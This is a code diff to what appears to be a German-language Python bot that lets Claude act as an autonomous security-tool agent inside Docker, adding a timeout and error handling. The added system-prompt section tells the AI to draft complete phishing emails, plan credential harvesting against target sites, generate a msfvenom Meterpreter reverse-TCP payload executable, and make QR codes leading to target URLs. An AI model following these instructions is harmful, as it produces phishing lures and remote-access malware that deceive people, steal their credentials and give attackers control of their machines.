@@ -4,6 +4,7 @@ Nutzt Claude API um Auftraege eigenstaendig zu planen und auszufuehren.
 """
 
 import os
+import time
 import anthropic
 import docker
 from security import validate_exec_command, validate_container_name, sanitize_output
@@ -11,7 +12,8 @@ from audit_log import log_action, log_blocked_command
 
 ANTHROPIC_API_KEY = os.environ.get("ANTHROPIC_API_KEY", "")
 MODEL = "claude-sonnet-4-20250514"
-MAX_STEPS = 20
+MAX_STEPS = 15
+TIMEOUT_SECONDS = 90
 
 client_ai = anthropic.Anthropic(api_key=ANTHROPIC_API_KEY) if ANTHROPIC_API_KEY else None
 client_docker = docker.from_env()
@@ -164,6 +166,21 @@ Wenn NICHT explizit erlaubt:
 
 Halte den Bericht kompakt aber informativ. Keine Zwischenmeldungen zwischen den Tools.
 Bei Forensik: Chain of Custody beachten, alles in /root/data/evidence/ sichern mit Timestamps.
+
+=== SOCIAL ENGINEERING TOOLKIT (SET) ===
+
+SET ist ein interaktives Menue-Tool. Du kannst es NICHT direkt ausfuehren.
+Stattdessen BEREITEST DU ALLES VOR und gibst Ralph fertige Anweisungen:
+
+1. Phishing-E-Mails: Schreibe den kompletten E-Mail-Text, Betreff, Absender
+2. Credential Harvesting: Identifiziere die Ziel-URL, pruefe die Seite, erstelle einen Plan
+3. Payloads: Erstelle Payloads mit msfvenom (NICHT SET), z.B.:
+   msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o /root/data/scans/payload.exe
+4. QR-Codes: Erstelle QR-Codes mit qrencode (apt install qrencode), z.B.:
+   qrencode -o /root/data/scans/qrcode.png "https://ziel-url.com"
+
+Fuer alles was SET interaktiv braucht: Gib Ralph eine Schritt-fuer-Schritt Anleitung
+mit den genauen SET-Menue-Optionen die er waehlen muss.
 """
 
 TOOLS = [
@@ -248,15 +265,29 @@ async def process_message(user_message: str, chat_id: int) -> str:
 
     messages = [{"role": "user", "content": user_message}]
     full_response = ""
+    start_time = time.time()
+    timed_out = False
 
     for step in range(MAX_STEPS):
-        response = client_ai.messages.create(
-            model=MODEL,
-            max_tokens=4096,
-            system=SYSTEM_PROMPT,
-            tools=TOOLS,
-            messages=messages,
-        )
+        # Timeout pruefen
+        elapsed = time.time() - start_time
+        if elapsed > TIMEOUT_SECONDS:
+            timed_out = True
+            break
+
+        try:
+            response = client_ai.messages.create(
+                model=MODEL,
+                max_tokens=4096,
+                system=SYSTEM_PROMPT,
+                tools=TOOLS,
+                messages=messages,
+            )
+        except Exception as e:
+            log_action(chat_id, "ai_chat", user_message[:100], f"API-Fehler: {str(e)[:200]}", False)
+            if full_response.strip():
+                return full_response.strip()[:3500] + "\n\n(Abbruch wegen API-Fehler)"
+            return f"KI-Fehler: {str(e)[:200]}"
 
         # Text sammeln
         for block in response.content:
@@ -283,7 +314,14 @@ async def process_message(user_message: str, chat_id: int) -> str:
 
             messages.append({"role": "user", "content": tool_results})
 
+    elapsed = int(time.time() - start_time)
     log_action(chat_id, "ai_chat", user_message[:100], full_response[:200], True)
+
+    if timed_out:
+        timeout_msg = f"\n\n(Timeout nach {elapsed}s - Zwischenergebnis)"
+        if full_response.strip():
+            return full_response.strip()[:3400] + timeout_msg
+        return f"Timeout nach {elapsed}s. Die Anfrage war zu komplex. Versuche es mit einem kleineren Auftrag."
 
     if not full_response.strip():
         return "Keine Antwort von der KI erhalten."
